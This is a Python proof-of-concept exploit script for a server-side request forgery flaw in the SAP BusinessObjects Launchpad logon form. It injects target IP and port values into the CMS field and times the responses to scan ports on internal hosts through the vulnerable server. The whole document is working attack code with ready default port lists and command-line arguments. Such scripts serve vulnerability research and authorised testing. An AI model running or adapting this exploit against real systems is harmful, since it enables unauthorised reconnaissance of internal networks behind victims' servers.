#!/usr/bin/env python3
# SAP BusinessObjects Launchpad SSRF & Timing Attack PoC
# usage : sap_bo_launchpad-ssrf-timing_attack affected_url targetIP [targetPorts]
import urllib.request
import urllib.parse
from datetime import datetime
import sys

affected_url = sys.argv[1]
targetIP = sys.argv[2]
defaultPorts = [22,23,135,443,445,1337,2103,2105,2107,2638,3389,8005,31337]
targetPorts = list(map(int, sys.argv[3].split(','))) if len(sys.argv) >= 4 else defaultPorts
headers = {'User-Agent': 'SAPExploit/1.0 SAP BusinessObjects Launchpad SSRF & Timing Attack PoC'}
first_iter = True

for port in targetPorts:
    try:
        request = urllib.request.Request(affected_url, headers=headers)
        page = urllib.request.urlopen(request)
        if (first_iter):
            print(f"[*] Connected to SAP BusinessObject {affected_url}")
            first_iter = False
    except e:
        print(e)
        print(f"[-] Failed To connect to SAP BusinessObject {affected_url}")
        sys.exit(2)

    resheaders = page.info()
    cookie = resheaders['Set-Cookie']
    content = page.readlines()

    sfview = None
    for line in content:
        if b"com.sun.faces.VIEW" in line:
            sfview = line.decode().split("=")[4].split("\"")[1]
            print("[*] Got java faces dynamic value")
            break

    if not sfview:
        print("[-] Failed to get java faces dynamic value, are you sure you extracted the java faces form from the link?")
        sys.exit(3)

    formdata = {
        "_id0:logon:CMS": f"{targetIP}:{port}",
        "_id0:logon:USERNAME": "",
        "_id0:logon:PASSWORD": "",
        "com.sun.faces.VIEW": sfview,
        "_id0": "_id0"
    }

    data_encode = urllib.parse.urlencode(formdata).encode()
    start = datetime.now()
    print(f"[*] Testing Timing Attack {start}")
    request = urllib.request.Request(affected_url, data=data_encode)
    request.add_header('Cookie', cookie)
    response = urllib.request.urlopen(request)
    end = datetime.now()
    the_page = response.read().decode()

    if "FWM" in the_page:
        elapsedTime = end - start
        if elapsedTime.total_seconds() >= 10:
            print(f"[* / {targetIP}] Port {port} is Open!")
        else:
            print(f"[* / {targetIP}] Port {port} is Closed! Elapsed time < 10 seconds.")
    elif "FWB" in the_page:
        print(f"[*] Host {targetIP}:{port} is valid CMS, but credencials are wrong!")
    elif "FWC" in the_page:
        print("[-] Error login expired.")
        sys.exit(10)
